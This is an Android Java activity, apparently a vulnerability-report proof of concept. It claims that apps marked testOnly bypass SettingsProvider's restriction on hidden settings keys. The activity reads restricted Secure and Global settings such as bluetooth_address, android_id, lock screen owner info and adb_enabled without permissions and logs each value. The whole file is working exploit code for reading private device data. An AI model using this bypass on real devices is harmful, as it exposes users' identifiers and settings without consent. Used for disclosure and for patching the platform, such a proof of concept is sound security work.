package com.vrp.testonly;

import android.app.Activity;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;

// SettingsProvider.enforceSettingReadable() skips its entire checkReadableAnnotation() call
// (the mechanism restricting @hide/non-@Readable Settings.Secure/Global/System keys to system
// apps only) whenever the CALLING app's ApplicationInfo has FLAG_TEST_ONLY set (0x100), which
// is trivially set by declaring android:testOnly="true" in the manifest -- no Android
// permission required. This probes a battery of normally-restricted keys.
public class SettingsReadBypassActivity extends Activity {
    private static final String T = "SETTINGS_TESTONLY_BYPASS";

    private static final String[] SECURE_KEYS = {
        "bluetooth_address",
        "lock_screen_owner_info",
        "lock_screen_owner_info_enabled",
        "location_providers_allowed",
        "trust_agents_extend_unlock",
        "user_setup_complete",
        "install_non_market_apps",
        "android_id",
        "last_setup_shown",
        "assisted_gps_enabled",
    };

    private static final String[] GLOBAL_KEYS = {
        "adb_enabled",
        "wifi_watchdog_ap_count_min",
        "device_name",
        "airplane_mode_on",
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            ApplicationInfo ai = getPackageManager().getApplicationInfo(getPackageName(), 0);
            boolean testOnly = (ai.flags & ApplicationInfo.FLAG_TEST_ONLY) != 0;
            Log.w(T, "UID=" + android.os.Process.myUid() + " ZERO permissions, FLAG_TEST_ONLY=" + testOnly);
        } catch (Exception e) {
            Log.w(T, "pm error: " + e);
        }

        for (String key : SECURE_KEYS) {
            tryRead("Secure", key);
        }
        for (String key : GLOBAL_KEYS) {
            tryRead("Global", key);
        }
    }

    private void tryRead(String table, String key) {
        try {
            String value;
            if ("Secure".equals(table)) {
                value = Settings.Secure.getString(getContentResolver(), key);
            } else {
                value = Settings.Global.getString(getContentResolver(), key);
            }
            Log.w(T, "[READ OK] " + table + "." + key + " = " + value);
        } catch (SecurityException se) {
            Log.w(T, "[BLOCKED] " + table + "." + key + " -> SecurityException: " + se.getMessage());
        } catch (Throwable t) {
            Log.w(T, "[ERROR] " + table + "." + key + " -> " + t);
        }
    }
}
